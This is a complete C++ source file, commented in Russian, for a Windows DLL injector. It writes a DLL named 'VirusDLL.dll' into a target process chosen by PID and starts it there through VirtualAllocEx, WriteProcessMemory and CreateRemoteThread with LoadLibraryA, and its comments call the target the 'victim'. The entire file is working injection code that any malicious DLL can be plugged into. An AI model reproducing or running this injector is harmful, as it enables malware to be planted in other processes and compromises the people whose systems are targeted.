/// @file DLLInjectorAsProcess/Source.cpp
/// @brief Инжектор DLL в виде исполняемого файла.
///        Принимает PID целевого процесса и загружает в него VirusDLL.dll
///        через CreateRemoteThread + LoadLibraryA.

#include <Windows.h>
#include <stdio.h>
#include <winerror.h>

/// @brief Точка входа.
/// @param argc Количество аргументов командной строки.
/// @param argv argv[1] — PID целевого процесса в десятичном виде.
int main(int argc, char* argv[])
{
    /// Имя DLL, которую внедряем. Поиск ведётся по стандартным путям Windows
    /// (каталог процесса, System32, PATH) — полный путь не обязателен.
    char szDLLPathToInject[] = {"VirusDLL.dll"};
    int nDLLPathLen = lstrlenA(szDLLPathToInject);
    int nTotBytesToAllocate = nDLLPathLen + 1;  // включая нулевой символ

    /// Шаг 0. Открываем целевой процесс.
    /// PROCESS_CREATE_THREAD  — право на создание потока в чужом процессе.
    /// PROCESS_VM_WRITE       — право на запись в виртуальную память жертвы.
    /// PROCESS_VM_OPERATION   — право на операции с виртуальной памятью (VirtualAllocEx).
    HANDLE hProcess =
        OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, atoi(argv[1]));

    /// Шаг 1. Выделяем страницу памяти в адресном пространстве жертвы.
    /// Туда запишем строку с путём к DLL — LoadLibraryA прочитает её из этой памяти.
    LPVOID lpHeapBaseAddress1 = VirtualAllocEx(hProcess,
                                               NULL,  /// адрес выбирает система
                                               nTotBytesToAllocate, MEM_COMMIT, PAGE_READWRITE);

    /// Шаг 2. Копируем путь к DLL в выделенную память жертвы.
    SIZE_T lNumberOfBytesWritten = 0;
    WriteProcessMemory(hProcess, lpHeapBaseAddress1, szDLLPathToInject, nTotBytesToAllocate, &lNumberOfBytesWritten);

    /// Шаг 3а. Получаем адрес LoadLibraryA из kernel32.dll текущего процесса.
    /// Поскольку ASLR рандомизирует базу kernel32 одинаково для всех процессов
    /// в рамках одной загрузки системы, этот адрес совпадает и в процессе-жертве.
    LPTHREAD_START_ROUTINE lpLoadLibraryStartAddress =
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA");

    /// Шаг 3б. Создаём поток в адресном пространстве жертвы.
    /// Точка входа потока — LoadLibraryA, аргумент — адрес строки из шага 2.
    /// Windows вызовет LoadLibraryA(<путь>), тот загрузит DLL и запустит
    /// DllMain с событием DLL_PROCESS_ATTACH.
    /// Шаг 3б. Создаём поток в адресном пространстве жертвы.
    HANDLE hRemoteThread =
        CreateRemoteThread(hProcess, NULL, 0, lpLoadLibraryStartAddress, lpHeapBaseAddress1, 0, NULL);

    if (!hRemoteThread)
    {
        printf("[!] CreateRemoteThread Failed With Error : %d\n", GetLastError());
        printf("[!] Injection FAILED - could not create remote thread\n");

        // Очистка выделенной памяти
        VirtualFreeEx(hProcess, lpHeapBaseAddress1, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;  // возвращаем код ошибки
    }

    /// Ждём результат загрузки DLL
    WaitForSingleObject(hRemoteThread, INFINITE);

    DWORD dwExitCode = 0;
    GetExitCodeThread(hRemoteThread, &dwExitCode);

    if (dwExitCode == 0)
    {
        printf("[!] Injection FAILED - LoadLibraryA returned NULL - DLL failed to load!\n");
    } else
    {
        printf("[+] Injection succeeded, DLL loaded at: %d\n", dwExitCode);
    }

    CloseHandle(hRemoteThread);
}